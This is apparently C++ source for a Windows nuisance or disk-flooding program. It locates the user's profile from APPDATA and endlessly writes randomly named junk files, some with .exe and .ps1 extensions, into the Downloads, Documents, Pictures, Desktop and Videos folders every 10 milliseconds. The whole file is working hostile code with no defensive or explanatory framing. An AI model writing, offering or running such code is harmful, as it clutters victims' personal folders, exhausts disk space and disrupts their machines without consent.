#include <iostream>
#include <fstream>
#include <windows.h>
#include <stdlib.h>
#include <vector>
#include <string>

using namespace std;

const char *dirs[5] = {"Downloads", "Documents", "Pictures", "Desktop", "Videos"};
const char *extension[10] = {".ps1", ".docx", ".txt", ".pptx", ".exe"};

string generate_filename(){
    string tempstr;
    char a;
    for (int i = 0; i < 9; i++){
        switch(rand() % 3){
            case 0:
                a = rand() % 9 + 48;
                break;
            case 1:
                a = rand() % 25 + 65;
                break;
            case 2:
                a = rand() % 25 + 97;
                break;
        }
        tempstr += a;
    }
    return tempstr;
}


int generateFiles(){
    
    string appdata = getenv("APPDATA");
    string s, token;
    size_t  pos = 0;

    for (int i = 0; i < 3; i++){
        pos = appdata.find("\\");
        token = appdata.substr(0, pos);
        s.append(token + "\\");
        appdata.erase(0, pos + 1);
    }

    while(1){
        string fulldir = s + dirs[rand() % 5];
        fulldir += "\\" + generate_filename() + extension[rand() % 5];
        cout << fulldir << endl;

        ofstream MyFile(fulldir);
        MyFile << generate_filename();
        MyFile.close();
        Sleep(10);
    }
}